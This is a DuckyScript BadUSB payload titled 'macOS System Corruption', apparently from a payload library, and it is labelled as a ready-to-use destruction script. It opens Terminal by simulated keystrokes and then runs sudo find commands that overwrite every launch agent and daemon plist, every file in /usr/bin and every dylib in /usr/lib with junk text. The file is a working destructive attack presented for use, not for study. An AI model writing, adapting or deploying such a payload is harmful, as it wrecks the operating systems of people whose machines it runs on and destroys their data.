REM Title: macOS System Corruption
REM Author: BadUSB Library
REM Description: Corrupts system files to cause instability
REM Target: macOS 10.15+
REM Category: Destruction
REM Type: Directly Ready

REM Open Terminal
DELAY 2000
GUI SPACE
DELAY 1000
STRING Terminal
ENTER
DELAY 3000

REM Corrupt system files
STRING sudo find /System/Library/LaunchAgents -name "*.plist" -exec sh -c 'echo "corrupted" > "$1"' _ {} \;
ENTER
DELAY 3000

STRING sudo find /System/Library/LaunchDaemons -name "*.plist" -exec sh -c 'echo "corrupted" > "$1"' _ {} \;
ENTER
DELAY 3000

STRING sudo find /usr/bin -name "*" -type f -exec sh -c 'echo "corrupted" > "$1"' _ {} \;
ENTER
DELAY 3000

STRING sudo find /usr/lib -name "*.dylib" -exec sh -c 'echo "corrupted" > "$1"' _ {} \;
ENTER
DELAY 3000
